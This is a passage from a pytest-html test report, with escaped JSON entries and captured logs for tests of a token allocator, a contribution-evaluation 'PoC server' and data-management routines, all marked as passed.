Malformed input dict raised exception: AttributeError\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_allocator_validation - INFO - \u2705 Malformed input bool raised exception: AttributeError\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_allocator_validation - INFO - \u2705 Token allocator input validation tested\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenAllocator.test_allocator_validation:test_framework.py:390 Testing token allocator input validation\nINFO     TestTokenAllocator.test_allocator_validation:test_framework.py:390 \u2705 Malformed input int raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_validation:test_framework.py:390 \u2705 Malformed input list raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_validation:test_framework.py:390 \u2705 Malformed input dict raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_validation:test_framework.py:390 \u2705 Malformed input bool raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_validation:test_framework.py:390 \u2705 Token allocator input validation tested\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenAllocator::test_calculate_reward_method&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenAllocator::test_calculate_reward_method&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenAllocator::test_calculate_reward_method&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_calculate_reward_method - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  gold_tier_reward: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_calculate_reward_method - INFO - Testing calculate_reward method\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_calculate_reward_method - INFO - \u2139\ufe0f  Reward calculation returned 0 (possibly due to invalid evaluation data)\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenAllocator.test_calculate_reward_method:test_framework.py:390 Testing calculate_reward method\nINFO     TestTokenAllocator.test_calculate_reward_method:test_framework.py:390 \u2139\ufe0f  Reward calculation returned 0 (possibly due to invalid evaluation data)\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenAllocator::test_generate_allocation_batch&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenAllocator::test_generate_allocation_batch&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenAllocator::test_generate_allocation_batch&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_generate_allocation_batch - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  batch_allocation_total: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_generate_allocation_batch - INFO - Testing generate_allocation_batch method\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_generate_allocation_batch - INFO - \u2139\ufe0f  Tier breakdown not implemented in summary yet\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_generate_allocation_batch - INFO - \u2705 Batch allocation: 0.0 total tokens\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenAllocator.test_generate_allocation_batch:test_framework.py:390 Testing generate_allocation_batch method\nINFO     TestTokenAllocator.test_generate_allocation_batch:test_framework.py:390 \u2139\ufe0f  Tier breakdown not implemented in summary yet\nINFO     TestTokenAllocator.test_generate_allocation_batch:test_framework.py:390 \u2705 Batch allocation: 0.0 total tokens\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenAllocator::test_private_validation_methods&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenAllocator::test_private_validation_methods&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenAllocator::test_private_validation_methods&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_private_validation_methods - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  validation_methods_tested: True\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_private_validation_methods - INFO - Testing private allocator methods\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_private_validation_methods - INFO - \u2705 Private validation and calculation methods working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenAllocator.test_private_validation_methods:test_framework.py:390 Testing private allocator methods\nINFO     TestTokenAllocator.test_private_validation_methods:test_framework.py:390 \u2705 Private validation and calculation methods working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenAllocator::test_token_calculation_logic&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenAllocator::test_token_calculation_logic&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenAllocator::test_token_calculation_logic&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_token_calculation_logic - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_token_calculation_logic - INFO - Testing token calculation logic\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_token_calculation_logic - INFO - \u26a0\ufe0f  Token calculation method not accessible\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_token_calculation_logic - INFO - \u26a0\ufe0f  Token calculation method not accessible\n2025-12-18 09:23:56,201 - TestTokenAllocator.test_token_calculation_logic - INFO - \u26a0\ufe0f  Token calculation method not accessible\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenAllocator.test_token_calculation_logic:test_framework.py:390 Testing token calculation logic\nINFO     TestTokenAllocator.test_token_calculation_logic:test_framework.py:390 \u26a0\ufe0f  Token calculation method not accessible\nINFO     TestTokenAllocator.test_token_calculation_logic:test_framework.py:390 \u26a0\ufe0f  Token calculation method not accessible\nINFO     TestTokenAllocator.test_token_calculation_logic:test_framework.py:390 \u26a0\ufe0f  Token calculation method not accessible\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_cleanup_test_submissions&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_cleanup_test_submissions&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_cleanup_test_submissions&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_cleanup_test_submissions - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,202 - TestPoCServer.test_cleanup_test_submissions - INFO - Testing test submission cleanup\n2025-12-18 09:23:56,204 - TestPoCServer.test_cleanup_test_submissions - INFO - \u2705 Test submission cleanup working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_cleanup_test_submissions:test_framework.py:390 Testing test submission cleanup\nINFO     TestPoCServer.test_cleanup_test_submissions:test_framework.py:390 \u2705 Test submission cleanup working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_evaluate_contribution_mocked&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_evaluate_contribution_mocked&#34;, &#34;duration&#34;: &#34;6 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_evaluate_contribution_mocked&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;6 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_evaluate_contribution_mocked - PASSED\nDuration: 0.01s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,204 - TestPoCServer.test_evaluate_contribution_mocked - INFO - Testing contribution evaluation with mocking\n2025-12-18 09:23:56,210 - TestPoCServer.test_evaluate_contribution_mocked - INFO - \u2705 Contribution evaluation with mocking working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_evaluate_contribution_mocked:test_framework.py:390 Testing contribution evaluation with mocking\nINFO     TestPoCServer.test_evaluate_contribution_mocked:test_framework.py:390 \u2705 Contribution evaluation with mocking working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_get_archive_statistics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_get_archive_statistics&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_get_archive_statistics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_get_archive_statistics - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,210 - TestPoCServer.test_get_archive_statistics - INFO - Testing archive statistics\n2025-12-18 09:23:56,211 - TestPoCServer.test_get_archive_statistics - INFO - \u2705 Archive statistics working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_get_archive_statistics:test_framework.py:390 Testing archive statistics\nINFO     TestPoCServer.test_get_archive_statistics:test_framework.py:390 \u2705 Archive statistics working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_get_epoch_info&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_get_epoch_info&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_get_epoch_info&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_get_epoch_info - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,212 - TestPoCServer.test_get_epoch_info - INFO - Testing epoch info retrieval\n2025-12-18 09:23:56,212 - TestPoCServer.test_get_epoch_info - INFO - \u2705 Epoch info retrieval working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_get_epoch_info:test_framework.py:390 Testing epoch info retrieval\nINFO     TestPoCServer.test_get_epoch_info:test_framework.py:390 \u2705 Epoch info retrieval working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_get_sandbox_map&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_get_sandbox_map&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_get_sandbox_map&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_get_sandbox_map - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,213 - TestPoCServer.test_get_sandbox_map - INFO - Testing sandbox map retrieval\n2025-12-18 09:23:56,214 - TestPoCServer.test_get_sandbox_map - INFO - \u2705 Sandbox map retrieval working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_get_sandbox_map:test_framework.py:390 Testing sandbox map retrieval\nINFO     TestPoCServer.test_get_sandbox_map:test_framework.py:390 \u2705 Sandbox map retrieval working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_get_tokenomics_statistics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_get_tokenomics_statistics&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_get_tokenomics_statistics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_get_tokenomics_statistics - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,214 - TestPoCServer.test_get_tokenomics_statistics - INFO - Testing tokenomics statistics\n2025-12-18 09:23:56,215 - TestPoCServer.test_get_tokenomics_statistics - INFO - \u2705 Tokenomics statistics working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_get_tokenomics_statistics:test_framework.py:390 Testing tokenomics statistics\nINFO     TestPoCServer.test_get_tokenomics_statistics:test_framework.py:390 \u2705 Tokenomics statistics working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_server_evaluation_pipeline&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_server_evaluation_pipeline&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_server_evaluation_pipeline&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_server_evaluation_pipeline - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  pipeline_tier: gold\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,215 - TestPoCServer.test_server_evaluation_pipeline - INFO - Testing server evaluation pipeline\n2025-12-18 09:23:56,216 - TestPoCServer.test_server_evaluation_pipeline - INFO - \u2705 Evaluation pipeline working, tier: gold\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_server_evaluation_pipeline:test_framework.py:390 Testing server evaluation pipeline\nINFO     TestPoCServer.test_server_evaluation_pipeline:test_framework.py:390 \u2705 Evaluation pipeline working, tier: gold\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_server_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_server_initialization&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_server_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_server_initialization - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,216 - TestPoCServer.test_server_initialization - INFO - Testing PoC server initialization\n2025-12-18 09:23:56,217 - TestPoCServer.test_server_initialization - INFO - \u2705 PoC server initialized\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_server_initialization:test_framework.py:390 Testing PoC server initialization\nINFO     TestPoCServer.test_server_initialization:test_framework.py:390 \u2705 PoC server initialized\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCServer::test_submit_contribution&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCServer::test_submit_contribution&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCServer::test_submit_contribution&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_submit_contribution - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,218 - TestPoCServer.test_submit_contribution - INFO - Testing contribution submission\n2025-12-18 09:23:56,219 - TestPoCServer.test_submit_contribution - INFO - \u2705 Contribution submission working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCServer.test_submit_contribution:test_framework.py:390 Testing contribution submission\nINFO     TestPoCServer.test_submit_contribution:test_framework.py:390 \u2705 Contribution submission working\n\n&#34;}], &#34;tests/test_data_management.py::TestDataManagement::test_concurrent_data_access&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_data_management.py::TestDataManagement::test_concurrent_data_access&#34;, &#34;duration&#34;: &#34;64 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_data_management.py::TestDataManagement::test_concurrent_data_access&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;64 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_concurrent_data_access - PASSED\nDuration: 0.06s\nCategory: integration\nMetrics:\n  concurrent_access_errors: 4\n  concurrent_access_success_rate: 84.00\n  final_counter: 16\n  total_accesses_recorded: 16\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,220 - TestDataManagement.test_concurrent_data_access - INFO - Testing concurrent data access\n2025-12-18 09:23:56,283 - TestDataManagement.test_concurrent_data_access - INFO - Expected accesses: 25, Actual: 16, Success rate: 84.0%\n2025-12-18 09:23:56,283 - TestDataManagement.test_concurrent_data_access - WARNING - \u26a0\ufe0f  4 concurrent access errors detected\n\n------------------------------ Captured log call -------------------------------\nINFO     TestDataManagement.test_concurrent_data_access:test_framework.py:390 Testing concurrent data access\nINFO     TestDataManagement.test_concurrent_data_access:test_framework.py:390 Expected accesses: 25, Actual: 16, Success rate: 84.0%\nWARNING  TestDataManagement.test_concurrent_data_access:test_framework.py:400 \u26a0\ufe0f  4 concurrent access errors detected\n\n&#34;}], &#34;tests/test_data_management.py::TestDataManagement::test_data_backup_and_recovery&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_data_management.py::TestDataManagement::test_data_backup_and_recovery&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_data_management.py::TestDataManagement::test_data_backup_and_recovery&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_data_backup_and_recovery - PASSED\nDuration: 0.00s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,284 - TestDataManagement.test_data_backup_and_recovery - INFO - Testing data backup and recovery\n2025-12-18 09:23:56,285 - TestDataManagement.test_data_backup_and_recovery - INFO - \u2705 Data backup and recovery working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestDataManagement.test_data_backup_and_recovery:test_framework.py:390 Testing data backup and recovery\nINFO     TestDataManagement.test_data_backup_and_recovery:test_framework.py:390 \u2705 Data backup and recovery working\n\n&#34;}], &#34;tests/test_data_management.py::TestDataManagement::test_data_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_data_management.py::TestDataManagement::test_data_validation&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_data_management.py::TestDataManagement::test_data_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_data_validation - PASSED\nDuration: 0.00s\nCategory: integration\nMetrics:\n  data_validation_rate: 100.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,285 - TestDataManagement.test_data_validation - INFO - Testing data validation\n2025-12-18 09:23:56,285 - TestDataManagement.test_data_validation - INFO - \u2705 Valid contribution accepted\n2025-12-18 09:23:56,286 - TestDataManagement.test_data_validation - INFO - \u2705 Invalid contribution 1 properly rejected: Missing required field: id\n2025-12-18 09:23:56,286 - TestDataManagement.test_data_validation - INFO - \u2705 Invalid contribution 2 properly rejected: Missing required field: title\n2025-12-18 09:23:56,286 - TestDataManagement.test_data_validation - INFO - \u2705 Invalid contribution 3 properly rejected: Empty required field: id\n2025-12-18 09:23:56,286 - TestDataManagement.test_data_validation - INFO - \u2705 Invalid contribution 4 properly rejected: Empty required field: id\n2025-12-18 09:23:56,286 - TestDataManagement.test_data_validation - INFO - \u2705 Invalid contribution 5 properly rejected: Missing required field: content\n2025-12-18 09:23:56,286 - TestDataManagement.test_data_validation - INFO - \u2705 Data validation: 5/5 invalid entries rejected (100.0%)\n\n------------------------------ Captured log call -------------------------------\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 Testing data validation\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 \u2705 Valid contribution accepted\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 \u2705 Invalid contribution 1 properly rejected: Missing required field: id\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 \u2705 Invalid contribution 2 properly rejected: Missing required field: title\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 \u2705 Invalid contribution 3 properly rejected: Empty required field: id\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 \u2705 Invalid contribution 4 properly rejected: Empty required field: id\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 \u2705 Invalid contribution 5 properly rejected: Missing required field: content\nINFO     TestDataManagement.test_data_validation:test_framework.py:390 \u2705 Data validation: 5/5 invalid entries rejected (100.0%)\n\n&#34;}], &#34;tests/test_data_management.py::TestDataManagement::test_file_operations_basic&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_data_management.py::TestDataManagement::test_file_operations_basic&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_data_management.py::TestDataManagement::test_file_operations_basic&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_file_operations_basic - PASSED\nDuration: 0.00s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,286 - TestDataManagement.test_file_operations_basic - INFO - Testing basic file operations\n2025-12-18 09:23:56,286 - TestDataManagement.test_file_operations_basic - INFO - \u2705 Basic file operations working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestDataManagement.test_file_operations_basic:test_framework.py:390 Testing basic file operations\nINFO     TestDataManagement.test_file_operations_basic:test_framework.py:390 \u2705 Basic file operations working\n\n&#34;}], &#34;tests/test_data_management.py::TestDataManagement::test_json_data_integrity&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_data_management.py::TestDataManagement::test_json_data_integrity&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_data_management.py::TestDataManagement::test_json_data_integrity&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_json_data_integrity - PASSED\nDuration: 0.00s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,287 - TestDataManagement.test_json_data_integrity - INFO - Testing JSON data integrity\n2025-12-18 09:23:56,287 - TestDataManagement.test_json_data_integrity - INFO - \u2705 JSON data integrity verified\n\n------------------------------ Captured log call -------------------------------\nINFO     